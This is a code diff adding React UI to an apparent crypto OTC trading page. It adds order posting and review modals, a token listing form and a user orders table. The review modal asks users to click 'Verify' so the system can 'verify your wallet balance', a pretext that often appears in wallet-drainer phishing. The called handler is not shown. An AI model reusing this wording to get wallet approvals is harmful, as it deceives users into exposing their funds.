@@ -541,6 +541,266 @@ const OTC = () => {
                 Enter a token contract address to view live OTC orders from real on-chain wallet holders. Order list refreshes every 3 minutes.
               </p>
 
+              </div>
+            </CardContent>
+          </Card>
+        </motion.div>
+
+        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
+          <Card className="glass-card border-white/10 mb-8 py-12">
+            <CardContent className="flex flex-col items-center justify-center text-center space-y-6">
+              <div className="p-4 rounded-full bg-primary/10 border border-primary/20">
+                <ArrowUpDown className="w-12 h-12 text-primary animate-pulse" />
+              </div>
+              <div>
+                <h2 className="text-2xl font-bold mb-2">Institutional Grade OTC Trading</h2>
+                <p className="text-muted-foreground max-w-xl mx-auto">
+                  Post your offer and get matched with other active traders. Once your offer is live, you'll receive requests from interested counterparties. 
+                  You can also browse active orders to find your perfect deal.
+                </p>
+              </div>
+              <Button size="lg" onClick={() => setShowPostModal(true)}
+                className="bg-gradient-to-r from-primary to-secondary text-white px-8 py-6 text-lg font-bold shadow-xl hover:shadow-[0_0_25px_hsl(var(--primary)/0.5)]">
+                Trade OTC
+              </Button>
+            </CardContent>
+          </Card>
+        </motion.div>
+
+        {/* Section 4: Token Listing */}
+        <div className="mb-8">
+          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.5 }}>
+            <Card className="glass-card border-white/10 h-full">
+              <CardHeader><CardTitle className="text-xl flex items-center gap-2"><FileText className="w-5 h-5" /> List Your Token for OTC</CardTitle></CardHeader>
+              <CardContent>
+                <p className="text-muted-foreground text-sm mb-4">Submit your {chainName} token to be available in the OTC marketplace.</p>
+                <Button className="w-full bg-gradient-to-r from-primary to-secondary text-white" onClick={() => setShowListingModal(true)}>
+                  Submit Token Listing
+                </Button>
+              </CardContent>
+            </Card>
+          </motion.div>
+        </div>
+
+        {/* Section 5: User Orders */}
+        {connected && (
+          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.6 }}>
+            <Card className="glass-card border-white/10">
+              <CardHeader><CardTitle className="text-xl flex items-center gap-2"><Wallet className="w-5 h-5" /> My OTC Orders</CardTitle></CardHeader>
+              <CardContent>
+                {userOrders.length === 0 ? (
+                  <p className="text-muted-foreground text-center py-8">No orders yet. Post your first OTC order to get started.</p>
+                ) : (
+                  <table className="w-full text-sm">
+                    <thead>
+                      <tr className="border-b border-white/10 text-muted-foreground">
+                        <th className="text-left p-3">Token</th>
+                        <th className="text-left p-3">Side</th>
+                        <th className="text-right p-3">Price</th>
+                        <th className="text-right p-3">Amount</th>
+                        <th className="text-left p-3">Status</th>
+                        <th className="text-right p-3">Action</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {userOrders.map(order => (
+                        <tr key={order.id} className="border-b border-white/5 hover:bg-white/5">
+                          <td className="p-3 font-medium">{order.tokenSymbol}</td>
+                          <td className="p-3"><Badge>{order.side.toUpperCase()}</Badge></td>
+                          <td className="p-3 text-right font-mono">${order.price}</td>
+                          <td className="p-3 text-right font-mono">{order.amount}</td>
+                          <td className="p-3"><Badge variant="outline">{order.status}</Badge></td>
+                          <td className="p-3 text-right">
+                            <Button size="sm" variant="ghost" className="text-red-400 text-xs">Cancel</Button>
+                          </td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                )}
+              </CardContent>
+            </Card>
+          </motion.div>
+        )}
+
+        {/* Footer */}
+        <motion.footer initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.7 }} className="mt-12 text-center text-xs text-muted-foreground">
+          <p>Built with ⚡ on {chainName}</p>
+          <Link to="/why-pegasus" className="text-primary hover:underline mt-1 inline-block">Why Pegswap?</Link>
+        </motion.footer>
+      </main>
+
+      {/* Post OTC Order Modal */}
+      <Modal isOpen={showPostModal} onClose={() => setShowPostModal(false)} title="Post OTC Order">
+        <div className="space-y-4">
+          <div>
+            <label className="text-sm text-muted-foreground mb-1 block">Token Contract Address</label>
+            <div className="flex gap-2">
+              <Input value={postContractAddress} onChange={e => setPostContractAddress(e.target.value)} placeholder={`Enter ${chainName} token address`} className="bg-white/5 border-white/10" />
+              <Button size="sm" onClick={() => fetchTokenDetails(postContractAddress, setPostTokenInfo)} disabled={isFetchingToken}>
+                {isFetchingToken ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
+              </Button>
+            </div>
+          </div>
+          {postTokenInfo && <TokenPreview info={postTokenInfo} />}
+          <div>
+            <label className="text-sm text-muted-foreground mb-1 block">Side</label>
+            <div className="flex gap-2">
+              <Button variant={postSide === 'buy' ? 'default' : 'outline'} className={postSide === 'buy' ? 'bg-green-600 flex-1' : 'flex-1 border-white/10'} onClick={() => setPostSide('buy')}>Buy</Button>
+              <Button variant={postSide === 'sell' ? 'default' : 'outline'} className={postSide === 'sell' ? 'bg-red-600 flex-1' : 'flex-1 border-white/10'} onClick={() => setPostSide('sell')}>Sell</Button>
+            </div>
+          </div>
+          <div className="grid grid-cols-2 gap-3">
+            <div>
+              <label className="text-sm text-muted-foreground mb-1 block">Price per Token ($)</label>
+              <Input type="number" value={postPrice} onChange={e => setPostPrice(e.target.value)} placeholder="0.00" className="bg-white/5 border-white/10" />
+            </div>
+            <div>
+              <label className="text-sm text-muted-foreground mb-1 block">Token Amount</label>
+              <Input type="number" value={postAmount} onChange={e => setPostAmount(e.target.value)} placeholder="0" className="bg-white/5 border-white/10" />
+            </div>
+          </div>
+          <div className="grid grid-cols-2 gap-3">
+            <div>
+              <label className="text-sm text-muted-foreground mb-1 block">Min Fill Amount</label>
+              <Input type="number" value={postMinFill} onChange={e => setPostMinFill(e.target.value)} placeholder="Optional" className="bg-white/5 border-white/10" />
+            </div>
+            <div>
+              <label className="text-sm text-muted-foreground mb-1 block">Expiration</label>
+              <select value={postExpiration} onChange={e => setPostExpiration(e.target.value)} className="w-full h-10 rounded-md bg-white/5 border border-white/10 px-3 text-sm">
+                <option value="1h">1 Hour</option>
+                <option value="6h">6 Hours</option>
+                <option value="24h">24 Hours</option>
+                <option value="7d">7 Days</option>
+              </select>
+            </div>
+          </div>
+          <div>
+            <label className="text-sm text-muted-foreground mb-1 block">Message (Optional)</label>
+            <Input value={postMessage} onChange={e => setPostMessage(e.target.value)} placeholder="Message to traders..." className="bg-white/5 border-white/10" />
+          </div>
+          <div>
+            <label className="text-sm text-muted-foreground mb-1 block">Phone Number (Optional)</label>
+            <Input value={postPhoneNumber} onChange={e => setPostPhoneNumber(e.target.value)} placeholder="+1 (555) 000-0000" className="bg-white/5 border-white/10" />
+          </div>
+          <div>
+            <label className="text-sm text-muted-foreground mb-1 block">Email Address (Optional)</label>
+            <Input type="email" value={postEmail} onChange={e => setPostEmail(e.target.value)} placeholder="email@example.com" className="bg-white/5 border-white/10" />
+          </div>
+          <Button className="w-full bg-gradient-to-r from-primary to-secondary text-white mt-2" onClick={handlePostOrder}>Submit Order</Button>
+        </div>
+      </Modal>
+
+      {/* Order Review & Verification Modal */}
+      <Modal isOpen={showReviewModal} onClose={() => setShowReviewModal(false)} title="Review Your OTC Order">
+        <div className="space-y-6">
+          {postTokenInfo && (
+            <div className="flex flex-col items-center justify-center p-6 rounded-2xl bg-white/5 border border-white/10 text-center">
+              {postTokenInfo.baseToken.logoURI && (
+                <motion.img 
+                  initial={{ scale: 0.8, opacity: 0 }} 
+                  animate={{ scale: 1, opacity: 1 }} 
+                  src={postTokenInfo.baseToken.logoURI} 
+                  alt={postTokenInfo.baseToken.name} 
+                  className="w-20 h-20 rounded-full mb-4 shadow-2xl shadow-primary/20 border-2 border-primary/30" 
+                />
+              )}
+              <h3 className="text-xl font-bold">{postTokenInfo.baseToken.name}</h3>
+              <p className="text-primary font-mono text-sm">{postTokenInfo.baseToken.symbol}</p>
+            </div>
+          )}
+
+          <div className="space-y-3">
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Order Side</span>
+              <Badge className={postSide === 'buy' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}>
+                {postSide.toUpperCase()}
+              </Badge>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Price per Token</span>
+              <span className="font-mono font-bold">${postPrice}</span>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Amount</span>
+              <span className="font-mono font-bold">{postAmount} {postTokenInfo?.baseToken.symbol}</span>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Expiration</span>
+              <span className="text-sm font-medium">{postExpiration}</span>
+            </div>
+            {postPhoneNumber && (
+              <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+                <span className="text-muted-foreground">Phone</span>
+                <span className="text-sm font-mono">{postPhoneNumber}</span>
+              </div>
+            )}
+            {postEmail && (
+              <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+                <span className="text-muted-foreground">Email</span>
+                <span className="text-sm font-mono">{postEmail}</span>
+              </div>
+            )}
+          </div>
+
+          <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/20 flex gap-3 items-start">
+            <AlertCircle className="w-5 h-5 text-amber-500 shrink-0 mt-0.5" />
+            <p className="text-xs text-amber-200/80 leading-relaxed">
+              To proceed, we need to verify your wallet balance. Click the button below to allow the system to confirm you have sufficient assets for this trade.
+            </p>
+          </div>
+
+          <div className="flex gap-3">
+            <Button variant="outline" className="flex-1 border-white/10" onClick={() => { setShowReviewModal(false); setShowPostModal(true); }} disabled={isVerifying}>
+              Back
+            </Button>
+            <Button className="flex-1 bg-gradient-to-r from-primary to-secondary text-white" onClick={handleConfirmPostOrder} disabled={isVerifying}>
+              {isVerifying ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Verifying...</> : 'Verify'}
+            </Button>
+          </div>
+        </div>
+      </Modal>
+
+      {/* Token Listing Review Modal */}
+      <Modal isOpen={showListingReviewModal} onClose={() => setShowListingReviewModal(false)} title="Review Token Listing Request">
+        <div className="space-y-6">
+          <div className="flex flex-col items-center justify-center p-6 rounded-2xl bg-white/5 border border-white/10 text-center">
+            {listingTokenInfo?.baseToken.logoURI ? (
+              <motion.img 
+                initial={{ scale: 0.8, opacity: 0 }} 
+                animate={{ scale: 1, opacity: 1 }} 
+                src={listingTokenInfo.baseToken.logoURI} 
+                alt={listingName} 
+                className="w-20 h-20 rounded-full mb-4 shadow-2xl shadow-primary/20 border-2 border-primary/30" 
+              />
+            ) : (
+              <div className="w-20 h-20 rounded-full bg-primary/10 border-2 border-primary/30 flex items-center justify-center mb-4">
+                <FileText className="w-10 h-10 text-primary" />
+              </div>
+            )}
+            <h3 className="text-xl font-bold">{listingName}</h3>
+            <p className="text-primary font-mono text-sm">{listingSymbol || 'TKN'}</p>
+          </div>
+
+          <div className="space-y-3">
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5 overflow-hidden">
+              <span className="text-muted-foreground shrink-0">Contract</span>
+              <span className="text-xs font-mono text-right truncate ml-4">{listingContract}</span>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Website</span>
+              <span className="text-sm text-right truncate ml-4">{listingWebsite || 'N/A'}</span>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Telegram</span>
+              <span className="text-sm text-right truncate ml-4">{listingTelegram || 'N/A'}</span>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Initial Liquidity</span>
+              <span className="text-sm font-bold text-right ml-4">${listingLiquidity || '0'}</span>
+            </div>
+          </div>
+
           <div className="p-5 rounded-xl bg-primary/5 border border-primary/10 space-y-4">
             <div className="flex gap-3 items-start">
               <AlertCircle className="w-6 h-6 text-primary shrink-0 mt-1" />
